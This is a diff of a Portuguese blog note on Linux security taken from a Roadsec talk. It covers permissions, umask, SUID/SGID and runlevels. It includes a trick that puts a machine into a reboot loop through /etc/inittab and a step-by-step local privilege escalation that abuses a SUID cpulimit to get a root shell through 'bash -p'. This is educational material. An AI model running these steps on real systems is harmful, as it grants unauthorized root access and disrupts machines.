@@ -5,6 +5,7 @@ lastUpdate: '2021-06-29'
 description: '"Usem linux… porque no linux não tem vírus?"'
 category: 'Linux'
 tags: 'security, roadsec, notes'
+author: 'mateusfg7'
 ---
 
 [screenshot1]: https://i.ibb.co/FwtgFW9/screenshot1.png
@@ -22,43 +23,41 @@ tags: 'security, roadsec, notes'
 
 # Notes
 
->  "Usem linux… porque no linux não tem vírus?"
+> "Usem linux… porque no linux não tem vírus?"
 
-Notas baseadas na live "Segurança em Linux — Christiano Linuxman | ROADSEC@HOME#37" da Roadsec, no YouTube. 
+Notas baseadas na live "Segurança em Linux — Christiano Linuxman | ROADSEC@HOME#37" da Roadsec, no YouTube.
 
 ## Identificação de usuários
 
-usuár.   | núme.
----------|---------
-**root** | _0_
-**syst.**| _1 a 999_
-**comum**| _1000 a 65535_
-
+| usuár.    | núme.          |
+| --------- | -------------- |
+| **root**  | _0_            |
+| **syst.** | _1 a 999_      |
+| **comum** | _1000 a 65535_ |
 
 ## Permissões
 
-ação     | núme.
----------|-------
-read     | 4
-write    | 2
-execute  | 1
-**total**| **7**
+| ação      | núme. |
+| --------- | ----- |
+| read      | 4     |
+| write     | 2     |
+| execute   | 1     |
+| **total** | **7** |
 
 ### Manipulação de arquivos
 
 Tudo no linux é **arquivo** ou **pasta**. A ordem de permissão de manipular esses arquivos é:
 
-  **dono**  |.| **grupo**  |.|  **outras**
-------------|-|------------|-|-------------
-**7**(_rwx_)| |**7**(_rwx_)| |**7**(_rwx_)
-
+| **dono**     | .   | **grupo**    | .   | **outras**   |
+| ------------ | --- | ------------ | --- | ------------ |
+| **7**(_rwx_) |     | **7**(_rwx_) |     | **7**(_rwx_) |
 
 A hierarquia de permissões se da por:
 
 - Pasta
   - Arquivo
   - Arquivo
-  
+
 ### Umask
 
 `umask` - **user mask** - _0 022_
@@ -87,16 +86,15 @@ $$755 - 111 = 644$$
 
 > O `d` junto com as perimções indica que o arquivo é um diretório.
 
-
 #### Permissões especiais
 
 Existem também as permissões especiais de usuário, representado pelo primeiro número da `umask` _**0**022_.
 
-permission | n.º | power
----|---|---
-SUID BIT | 4 | rodar binários com o poder de root 
-SGID BIT | 2 | PDC
-STICK BIT | 1 | define que só quem pode deletar um arquivo é o dono
+| permission | n.º | power                                               |
+| ---------- | --- | --------------------------------------------------- |
+| SUID BIT   | 4   | rodar binários com o poder de root                  |
+| SGID BIT   | 2   | PDC                                                 |
+| STICK BIT  | 1   | define que só quem pode deletar um arquivo é o dono |
 
 Imagine o cenário que precisamos que alguém execute o comando `shutdown`, porem não queremos passar a senha de _root_. Podemos dar a permissão _SUID BIT_ para o binário `shutdown`:
 
@@ -174,17 +172,17 @@ O sistema sentou. Bem, para resolver isso é só dar o `mv` de volta…
 
 No linux temos 6 tipos de _runlevel_, são eles:
 
-n.º | command
----|---
-0 | shutdown
-1 | modo de segurança
-2 | multi-usuário/sem gráfico (debian)
-3 | multi-usuário
-4 | personalização
-5 | multi-usuário/gráfico
-6 | reboot
+| n.º | command                            |
+| --- | ---------------------------------- |
+| 0   | shutdown                           |
+| 1   | modo de segurança                  |
+| 2   | multi-usuário/sem gráfico (debian) |
+| 3   | multi-usuário                      |
+| 4   | personalização                     |
+| 5   | multi-usuário/gráfico              |
+| 6   | reboot                             |
 
-Então se eu souber qual é o primeiro processo, que é o `init` e chamar o _runlevel_ 0 a máquina irá desligar. 
+Então se eu souber qual é o primeiro processo, que é o `init` e chamar o _runlevel_ 0 a máquina irá desligar.
 
 ```
 $ init 0
@@ -203,12 +201,15 @@ Na pasta `rc5.d`, por exemplo, temos alguns processos que não irão subir, inic
 ![/assets/seguranca-em-linux-notes/screenshot8][screenshot8]
 
 No arquivo `/etc/inittab`, na segunda linha temos:
+
 ```
 id:5:initdefault
 ```
+
 Oque aconteceria se mudarmos esse número de 5 para 6, e desligarmos, logo após, alguém ligar o PC para navegar na internet? A sequência é:
 
 _`id:5:initdefault`_
+
 - Botão Power
   - BIOS/MBR
     - gerenciador de boots (grub2)
@@ -218,6 +219,7 @@ _`id:5:initdefault`_
             - DE (onde estamos)
 
 _`id:6:initdefault`_
+
 - Botão Power
   - BIOS/MBR
     - gerenciador de boots (grub2)
@@ -225,7 +227,7 @@ _`id:6:initdefault`_
         - init = 6 (reboot)
 
 Caímos em um loop.
-          
+
 ## Privilege Escalation
 
 Vamos tentar fazer um ataque de _privilege escalation_ em um Linux, usando as permissões como área de exploração.
@@ -246,31 +248,36 @@ Bem, se podemos executar um binário como root, e se usarmos isso para dar permi
 
 ![/assets/seguranca-em-linux-notes/screenshot12][screenshot12]
 
+1. Dou permissão SUID BIT para o binário bash
 
+```
+~$ cpulimit -l 100 -f chmod 4755 /usr/bin/bash
+```
 
-1. Dou permissão SUID BIT para o binário bash  
-  ```
-  ~$ cpulimit -l 100 -f chmod 4755 /usr/bin/bash
-  ```
-2. Movo o binário para minha pasta  
-  ```
-  ~$ cpulimit -l 100 -f cp /usr/bin/bash /mr_robot/
-  ```
+2. Movo o binário para minha pasta
+
+```
+~$ cpulimit -l 100 -f cp /usr/bin/bash /mr_robot/
+```
+
 3. Certifico que ele tem as permissões necessárias
-  ```
-  ~$ cpulimit -l 100 -f chmod +s /mr_robot/bash
-  ```
+
+```
+~$ cpulimit -l 100 -f chmod +s /mr_robot/bash
+```
+
 4. Por fim executo o binário
-  ```
-  ~$ ./bash -p
-  ```
-  ```
-  ~# id
-  uid=1001(mateus) gid=1001(mateus) euid=0(root) groups=1001(mateus)
-  ```
+
+```
+~$ ./bash -p
+```
+
+```
+~# id
+uid=1001(mateus) gid=1001(mateus) euid=0(root) groups=1001(mateus)
+```
 
 ---
-
 
 # referências
 
